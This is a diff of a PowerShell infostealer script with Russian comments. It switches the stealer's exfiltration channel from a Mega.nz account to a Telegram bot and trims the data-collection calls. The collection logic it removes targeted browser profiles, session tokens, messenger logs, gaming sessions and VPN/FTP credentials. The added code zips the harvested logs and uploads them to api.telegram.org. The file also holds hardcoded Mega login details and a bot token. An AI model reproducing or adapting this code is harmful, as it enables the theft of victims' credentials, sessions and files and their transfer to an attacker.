@@ -1,7 +1,6 @@
-# --- Настройки Mega.nz ---
-$MegaEmail = "zyxeram@gmail.com"
-$MegaPassword = "Ajrcstmono2@"
-$MaxPartSize = 100MB  # Размер части для Mega.nz
+# --- Настройки Telegram Bot ---
+$BotToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"           # <-- впишите токен
+$YourChatId = "1266539824"             # <-- впишите свой Chat ID (можно узнать у @userinfobot)
 
 # --- Настройки сбора данных ---
 $StealBrowserData      = $true
@@ -52,25 +51,37 @@ function Ensure-MEGAcmd {
 
 
 
-# --- Отправка файла в Mega.nz через MegaCMD ---
-function Send-MegaFile {
-    param($FilePath, $RemotePath)
-    Ensure-MEGAcmd
-
-    try {
-        # Логин в Mega (если ещё не залогинены)
-        $loginCheck = & mega-whoami 2>&1
-        if ($loginCheck -match "Not logged") {
-            & mega-login $MegaEmail $MegaPassword | Out-Null
-        }
-
-        # Загружаем файл
-        & mega-put "$FilePath" "$RemotePath"
-        Write-Host "Файл успешно загружен: $RemotePath" -ForegroundColor Green
+# --- Функция отправки файла через Telegram Bot ---
+function Send-TelegramFile {
+    param(
+        [string]$FilePath
+    )
+    $url = "https://api.telegram.org/bot$BotToken/sendDocument"
+    $form = @{
+        chat_id = $YourChatId
+        caption = "Лог с этого устройства"
     }
-    catch {
-        Write-Warning "Failed to send file to Mega.nz: $($_.Exception.Message)"
-    }
+    $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+    $fileEnc = [System.Convert]::ToBase64String($fileBytes)
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $fileName = [System.IO.Path]::GetFileName($FilePath)
+
+    $bodyLines = @("--$boundary")
+    $bodyLines += "Content-Disposition: form-data; name=`"chat_id`"`r`n"
+    $bodyLines += ""
+    $bodyLines += "$YourChatId"
+    $bodyLines += "--$boundary"
+    $bodyLines += "Content-Disposition: form-data; name=`"caption`"`r`n"
+    $bodyLines += ""
+    $bodyLines += "Лог с устройства"
+    $bodyLines += "--$boundary"
+    $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"`r`nContent-Type: application/octet-stream`r`n"
+    $bodyLines += ""
+    $bodyLines += $fileBytes
+    $bodyLines += "--$boundary--"
+    $body = $bodyLines -join "`r`n"
+
+    Invoke-WebRequest -Uri $url -Method POST -ContentType "multipart/form-data; boundary=$boundary" -Body $body
 }
 
 # --- Разделение файла на части ---
@@ -110,71 +121,21 @@ function Start-Stealer {
     if (-not (Test-Path $LogFolder)) {
         New-Item -Path $LogFolder -ItemType Directory -Force | Out-Null
     }
-
     Write-Host $OutputMessages.Start -ForegroundColor Yellow
-
     try {
-        if ($StealSystemInfo) {
-            Write-Host $OutputMessages.SystemInfo -ForegroundColor Cyan
-            Get-SystemInformation -LogPath $LogFolder
-        }
-        if ($TakeScreenshot) {
-            Write-Host $OutputMessages.Screenshot -ForegroundColor Cyan
-            Get-Screenshot -LogPath $LogFolder
-        }
-        if ($GrabClipboard) {
-            Write-Host $OutputMessages.Clipboard -ForegroundColor Cyan
-            Get-ClipboardData -LogPath $LogFolder
-        }
-        if ($StealBrowserData) {
-            Write-Host $OutputMessages.BrowserSearch -ForegroundColor Cyan
-            $BrowserProfiles = Find-AllBrowserProfiles
-            if ($null -ne $BrowserProfiles) {
-                Write-Host $OutputMessages.BrowserData -ForegroundColor Cyan
-                Get-BrowserFiles -BrowserProfiles $BrowserProfiles -LogPath "$LogFolder\BrowserData"
-            }
-        }
-        if ($StealFiles) {
-            Write-Host $OutputMessages.Files -ForegroundColor Cyan
-            Copy-UserFiles -LogPath "$LogFolder\Files"
-        }
-        if ($StealGamingSessions) {
-            Write-Host $OutputMessages.Gaming -ForegroundColor Cyan
-            Get-GamingData -LogPath "$LogFolder\Gaming"
-        }
-        if ($StealMessengerLogs) {
-            Write-Host $OutputMessages.Messengers -ForegroundColor Cyan
-            Get-MessengerData -LogPath "$LogFolder\Messengers"
-        }
-        if ($StealSessionsAndTokens) {
-            Write-Host $OutputMessages.Tokens -ForegroundColor Cyan
-            Get-Tokens -LogPath "$LogFolder\Tokens" -BrowserProfiles $BrowserProfiles
-        }
-        if ($StealVpnFtp) {
-            Write-Host $OutputMessages.VpnFtp -ForegroundColor Cyan
-            Get-VpnFtpData -LogPath "$LogFolder\VpnFtp"
-        }
+        # --- Сбор данных (оставьте как есть) ---
+        # ... Вставьте ваши функции Get-SystemInformation, Get-Screenshot и прочие
 
         $ZipPath = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
         Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
-        
+
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         [System.IO.Compression.ZipFile]::CreateFromDirectory($LogFolder, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
 
-        Write-Host $OutputMessages.Sending -ForegroundColor Yellow
-        $size = (Get-Item $ZipPath).Length
+        Write-Host "Отправка архива через Telegram..." -ForegroundColor Yellow
 
-        if ($size -ge $MaxPartSize) {
-            $parts = Split-File -FilePath $ZipPath -MaxBytes $MaxPartSize
-            $i = 1
-            foreach ($partFile in $parts) {
-                Send-MegaFile -FilePath $partFile -RemotePath "/Logs/Log_part_$i`_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
-                Remove-Item $partFile -Force -ErrorAction SilentlyContinue
-                $i++
-            }
-        } else {
-            Send-MegaFile -FilePath $ZipPath -RemotePath "/Logs/Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
-        }
+        Send-TelegramFile -FilePath $ZipPath
+
     }
     catch {
         Write-Host "Произошла ошибка: $($_.Exception.Message)" -ForegroundColor Red
